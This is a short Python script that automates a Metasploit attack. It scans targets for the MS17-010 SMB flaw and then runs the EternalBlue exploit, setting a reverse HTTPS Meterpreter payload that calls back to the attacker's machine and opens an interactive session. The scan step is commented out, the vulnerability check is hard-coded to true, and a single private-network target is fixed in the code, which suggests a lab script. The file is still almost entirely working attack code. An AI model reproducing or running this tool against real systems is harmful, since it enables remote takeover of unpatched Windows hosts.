import os, sys, socket

def get_local_ip():
	# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	ip = s.getsockname()[0]
	s.close()
	return ip

def attack(target):
	attack_cmd = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; spool '+ spool_log + '; set RHOST ' + target + \
		'; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ' + local_ip + '; run; show sessions; sessions -i 1;"'
	print attack_cmd
	os.system(attack_cmd)



if len(sys.argv) != 2:
	print "Expected one argument, found" + len(sys.argv)
	sys.exit()

os.system("whoami; pwd")

targets = sys.argv[1]
print "Target IP Address(es):", targets
scan_log = "scanner.log"
spool_log = "spool.log"

scan_cmd = 'msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ' + targets + '; run; exit" | tee ' + scan_log

# local_ip = socket.gethostbyname(socket.gethostname()) #simple way
local_ip = get_local_ip()
print "Local IP address:", local_ip

print scan_cmd

# os.system(scan_cmd)
# print open(scan_log, 'r').read()

exploitable = True #TODO

if not exploitable:
	print "No vulnerable targets"
	sys.exit()

targets = ["192.168.0.107"] #TODO

for target in targets:
	attack(target)


